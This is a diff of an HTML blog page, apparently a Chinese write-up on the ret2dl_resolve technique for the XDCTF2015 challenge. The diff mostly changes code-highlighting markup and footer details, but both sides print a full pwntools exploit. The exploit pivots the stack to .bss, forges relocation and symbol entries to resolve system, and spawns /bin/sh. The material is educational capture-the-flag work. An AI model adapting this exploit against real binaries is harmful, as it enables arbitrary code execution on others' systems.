@@ -155,8 +155,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">readelf -S elf_name
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">readelf -S elf_name
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>在程序第一次调用某个函数时，关于plt处指令以及push操作什么的就不细说了，我认为整个流程大致可以这么理解：</p>
 <ul>
@@ -265,83 +265,83 @@
 </span><span class="lnt">76
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
-<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
-<span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
-
-<span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048619</span> <span class="c1"># ROPgadget --binary bof --only &#34;pop|ret&#34;</span>
-<span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804861b</span> <span class="c1"># ROPgadget --binary parelro_x86 | grep &#39;pop ebp ; ret&#39;</span>
-<span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048458</span> <span class="c1"># ROPgadget --binary bof --only &#34;leave|ret&#34;</span>
-
-<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
-<span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x0804a040</span> <span class="c1"># readelf -S bof | grep &#34;.bss&#34;</span>
-<span class="n">plt_0</span> <span class="o">=</span> <span class="mh">0x08048380</span> <span class="c1"># objdump -d -j .plt bof  执行 &lt;push link_map，jmp dl_resolve&gt;</span>
-<span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x08048330</span> <span class="c1"># objdump -s -j .rel.plt bof</span>
-
-<span class="c1"># 栈迁移的目的地</span>
-<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
-
-<span class="n">index_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">-</span> <span class="n">rel_plt</span> <span class="c1"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span>
-<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
-<span class="n">dynsym</span> <span class="o">=</span> <span class="mh">0x080481d8</span>
-<span class="n">dynstr</span> <span class="o">=</span> <span class="mh">0x08048278</span>
-
-<span class="c1"># fake_sym_addr 地址按照0x10字节对齐</span>
-<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">36</span>
-<span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="c1"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span>
-<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
-
-<span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span> <span class="c1"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span>
-<span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span> <span class="c1"># 要满足：ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7</span>
-<span class="n">fake_reloc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
-<span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="n">dynstr</span> <span class="c1"># 加0x10因为Elf32_Sym的大小为0x10</span>
-<span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
-
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span> <span class="c1"># 读100个字节到base_stage</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span> <span class="c1"># 把base_stage pop到ebp中</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span> <span class="c1"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-
-<span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span>
-
-<span class="c1"># stage3: </span>
-<span class="c1"># 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容</span>
-<span class="c1"># 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容</span>
-<span class="c1"># --------&gt; base_stage</span>
-<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_0</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span> <span class="c1"># 对应system(&#39;/bin/sh&#39;)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># 后面的2个参数不需要了</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
-<span class="c1"># (base_stage+28)的位置</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_reloc</span>
-<span class="c1"># (base_stage+36)的位置</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">align</span>
-<span class="c1"># (fake_sym_addr)的位置</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_sym</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;system</span><span class="se">\x00</span><span class="s2">&#34;</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
-<span class="c1"># base_stage + 80</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">cmd</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
-<span class="c1"># payload2结束，刚好100字节</span>
-
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ppp_ret</span> <span class="o">=</span> <span class="mh">0x08048619</span> <span class="c1"># ROPgadget --binary bof --only &#34;pop|ret&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804861b</span> <span class="c1"># ROPgadget --binary parelro_x86 | grep &#39;pop ebp ; ret&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span> <span class="o">=</span> <span class="mh">0x08048458</span> <span class="c1"># ROPgadget --binary bof --only &#34;leave|ret&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss_addr</span> <span class="o">=</span> <span class="mh">0x0804a040</span> <span class="c1"># readelf -S bof | grep &#34;.bss&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">plt_0</span> <span class="o">=</span> <span class="mh">0x08048380</span> <span class="c1"># objdump -d -j .plt bof  执行 &lt;push link_map，jmp dl_resolve&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">rel_plt</span> <span class="o">=</span> <span class="mh">0x08048330</span> <span class="c1"># objdump -s -j .rel.plt bof</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 栈迁移的目的地</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">index_offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">-</span> <span class="n">rel_plt</span> <span class="c1"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynsym</span> <span class="o">=</span> <span class="mh">0x080481d8</span>
+</span></span><span class="line"><span class="cl"><span class="n">dynstr</span> <span class="o">=</span> <span class="mh">0x08048278</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fake_sym_addr 地址按照0x10字节对齐</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">36</span>
+</span></span><span class="line"><span class="cl"><span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span> <span class="c1"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">//</span> <span class="mh">0x10</span> <span class="c1"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span>
+</span></span><span class="line"><span class="cl"><span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span> <span class="c1"># 要满足：ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT，即最低字节要为7</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_reloc</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">st_name</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">-</span> <span class="n">dynstr</span> <span class="c1"># 加0x10因为Elf32_Sym的大小为0x10</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_sym</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">st_name</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x12</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./parelro_x86&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span> <span class="c1"># 读100个字节到base_stage</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ppp_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebp_ret</span><span class="p">)</span> <span class="c1"># 把base_stage pop到ebp中</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span> <span class="c1"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cmd</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># stage3: </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 栈迁移，调plt[0]，传入伪造的 index_offset，指向我们自定义的.rel.plt表项内容</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 并且控制r_info，指向我们伪造的.dynsym表项；再控制.dynsym表项中的st_name，指向我们控制的.dynstr表项内容</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># --------&gt; base_stage</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">plt_0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;AAAA&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span> <span class="c1"># 对应system(&#39;/bin/sh&#39;)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="c1"># 后面的2个参数不需要了</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (base_stage+28)的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_reloc</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (base_stage+36)的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="n">align</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># (fake_sym_addr)的位置</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">fake_sym</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;system</span><span class="se">\x00</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># base_stage + 80</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">cmd</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload2</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># payload2结束，刚好100字节</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>写一遍下来，感觉在没有完完全全弄透彻的情况下，通过文字描述清晰还是比较难的，但也只能先这样了😶</p>
 <h2 id="参考链接">参考链接：</h2>
@@ -384,8 +384,8 @@
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
